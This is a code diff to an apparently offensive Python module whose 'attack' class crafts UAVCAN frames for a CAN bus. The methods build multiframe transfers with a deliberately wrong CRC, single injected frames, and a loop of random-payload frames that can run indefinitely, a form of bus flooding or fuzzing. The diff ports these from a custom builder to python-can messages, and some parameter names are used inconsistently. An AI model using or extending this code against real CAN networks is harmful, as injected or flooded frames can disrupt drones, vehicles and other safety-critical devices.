@@ -13,74 +13,74 @@ class CAN:
 class attack:
     # send multiframe message with wrong CRC
     def wrong_CRC(self, CRC = 'AA AA', payload = 'BB BB BB BB', padding = True):
-        payload = payload.split(' ')
+        payload = CRC.split(' ') + payload.split(' ')
 
         transfer_start  = 0b1
         transfer_end    = 0b0
         toggle          = 0b0
         transfer_ID     = 0b00000
 
-        if len(payload) < 6:
+        if len(payload) < 7:
             if padding: payload += ["00" for _ in range(5 - len(payload))]
-            print(CAN.build(
-                    'can0', 
-                    10015501, 
-                    f'{CRC} {" ".join(payload)}' +
-                    UAVCAN_PAYLOAD.tail(
-                        transfer_start, 
-                        transfer_end, 
-                        toggle, 
-                        transfer_ID
-                        )
-                    )
-                )
+            msg = can.Message(
+                arbitration_id=10015501,
+                extended_id=True,
+                data=bytearray.fromhex(' '.join(payload))
+            )
+            print(msg)
         else:
-            print(CAN.build(
-                    'can0', 
-                    10015501, 
-                    f'{CRC} {" ".join(payload[ : 5 ])}' +
-                    UAVCAN_PAYLOAD.tail(
+            msg = can.Message(
+                arbitration_id=10015501,
+                extended_id=True,
+                data=bytearray.fromhex(
+                    ' '.join(payload[ : 7 ] + 
+                    [ UAVCAN_PAYLOAD.tail(
                         transfer_start, 
                         transfer_end, 
                         toggle, 
                         transfer_ID
-                        )
-                    )
+                    ) ] )
                 )
-            payload = payload[ 5 : ]
+            )
+            print(msg)
+            payload = payload[ 7 : ]
 
             transfer_start  = 0b0
             while len(payload) > 7:
                 toggle ^= 0b1
-                print(CAN.build(
-                        'can0',
-                        10015501,
-                        " ".join(payload[ : 7 ]) + 
-                        UAVCAN_PAYLOAD.tail(
+                msg = can.Message(
+                    arbitration_id=10015501,
+                    extended_id=True,
+                    data=bytearray.fromhex(
+                        ' '.join(payload[ : 7 ] +
+                        [ UAVCAN_PAYLOAD.tail(
                             transfer_start, 
                             transfer_end, 
                             toggle, 
                             transfer_ID
-                            )
-                        )
+                        ) ] )
                     )
+                )
+                print(msg)
 
                 payload = payload[ 7 : ]
 
             transfer_end = 0b1
             toggle ^= 0b1
-            print(CAN.build(
-                'can0', 
-                10015501, 
-                " ".join(payload) + 
-                UAVCAN_PAYLOAD.tail(
-                    transfer_start, 
-                    transfer_end, 
-                    toggle, 
-                    transfer_ID
+            msg = can.Message(
+                arbitration_id=10015501,
+                is_extended_id=True,
+                data=bytearray.fromhex(
+                        ' '.join(payload +
+                        [ UAVCAN_PAYLOAD.tail(
+                            transfer_start, 
+                            transfer_end, 
+                            toggle, 
+                            transfer_ID
+                        ) ] )
                     )
-                )
             )
+            print(msg)
 
         print()
 
@@ -110,18 +110,20 @@ class attack:
         transfer_ID     = 0b00000
 
         if padding: payload += ["00" for _ in range(7 - len(payload))]
-        print(CAN.build(
-                'can0', 
-                10015501, 
-                f'{" ".join(payload)}' + 
-                UAVCAN_PAYLOAD.tail(
-                    transfer_start, 
-                    transfer_end, 
-                    toggle, 
-                    transfer_ID
-                    )
+        msg = can.Message(
+            arbitration_id=10015501,
+            is_extended_id=True,
+            data=bytearray.fromhex(
+                    ' '.join(payload +
+                    [ UAVCAN_PAYLOAD.tail(
+                        transfer_start, 
+                        transfer_end, 
+                        toggle, 
+                        transfer_ID
+                    ) ] )
                 )
-            )
+        )
+        print(msg)
 
         print()
 
@@ -145,34 +147,42 @@ class attack:
         toggle          = 0b0
         transfer_ID     = 0b00000
 
-        print(CAN.build(
-                'can0', 
-                10015501, 
+        msg = can.Message(
+            arbitration_id=10015501,
+            is_extended_id=True,
+            data=bytearray.fromhex(
                 UAVCAN_PAYLOAD.random() +
-                UAVCAN_PAYLOAD.tail(
-                    transfer_start, 
-                    transfer_end, 
-                    toggle, 
-                    transfer_ID
-                    )
-                )
-            )
-
-        transfer_start  = 0b0
-        while counter:
-            toggle ^= 0b1
-            print(CAN.build(
-                    'can0',
-                    10015501,
-                    UAVCAN_PAYLOAD.random() + 
-                    UAVCAN_PAYLOAD.tail(
+                ' '.join(
+                    [ UAVCAN_PAYLOAD.tail(
                         transfer_start, 
                         transfer_end, 
                         toggle, 
                         transfer_ID
-                        )
+                    ) ]
+                )
+            )
+        )
+        print(msg)
+
+        transfer_start  = 0b0
+        while counter:
+            toggle ^= 0b1
+            msg = can.Message(
+                arbitration_id=10015501,
+                is_extended_id=True,
+                data=bytearray.fromhex(
+                    UAVCAN_PAYLOAD.random() +
+                    ' '.join(
+                        [ UAVCAN_PAYLOAD.tail(
+                            transfer_start, 
+                            transfer_end, 
+                            toggle, 
+                            transfer_ID
+                        ) ]
                     )
                 )
+            )
+            print(msg)
             if counter != -1: counter -= 1
 
 def main():
